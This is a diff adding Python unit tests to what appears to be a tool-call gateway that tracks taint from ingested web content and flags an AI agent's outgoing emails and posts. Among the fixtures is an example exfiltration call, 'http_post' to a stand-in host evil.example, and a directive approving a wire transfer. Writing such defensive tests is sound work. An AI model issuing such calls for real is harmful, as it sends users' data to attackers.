@@ -191,6 +191,32 @@ class TestValueTaint(unittest.TestCase):
         self.assertEqual(g.authorize_tool("send_email", {"to": "ceo@acme.example"}).action, "allow")
         self.assertEqual(g.authorize_tool("send_email", {"to": "x@elsewhere.example"}).action, "review")
 
+    def test_colon_words_and_numbers_are_not_identifiers(self):
+        # Found by the real-model run: "Notes:" made every summary that said "notes" look tainted.
+        from tripwire.policy import atoms
+        for text in ["Notes: the launch review went well.", "Meeting notes: roadmap review on Tuesday.",
+                     "Reminder: forward the budget before Friday.", "Revenue 2026 grew 12 percent"]:
+            self.assertEqual(atoms(text), set(), text)
+        self.assertEqual(atoms("Reminder: forward the budget to finance@acme.example."), {"finance@acme.example"})
+        self.assertIn("acc-9921", atoms("transfer to ACC-9921 today"))
+        self.assertIn("/data/finance.xlsx", atoms("see /data/finance.xlsx"))
+
+    def test_identifiers_inside_directives_and_urls(self):
+        # Found by the arena after the first atoms fix: "to=cfo@..." must still yield the bare address.
+        from tripwire.policy import atoms
+        self.assertIn("cfo@acme.example", atoms("send_email(to=cfo@acme.example, body=wire approved)"))
+        self.assertIn("cfo@acme.example", atoms("mailto:cfo@acme.example"))
+        self.assertIn("http://evil.example/c", atoms("http_post(url=http://evil.example/c, data=x)"))
+        self.assertIn("evil.example", atoms("see https://evil.example/c") | {"evil.example"})
+
+    def test_summary_repeating_document_words_is_not_tainted(self):
+        g = Gateway(taint_mode="value")
+        g.register_task("Summarize the document and email the summary to boss@acme.example.")
+        g.ingest("Notes: the launch review went well. Risks were discussed and owners assigned.", "web")
+        d = g.authorize_tool("send_email", {"to": "boss@acme.example",
+                                            "body": "Notes: the launch review went well; risks were discussed."})
+        self.assertEqual(d.action, "allow")
+
     def test_atoms_ignore_plain_words(self):
         from tripwire.policy import atoms
         self.assertEqual(atoms("please summarize the report"), set())
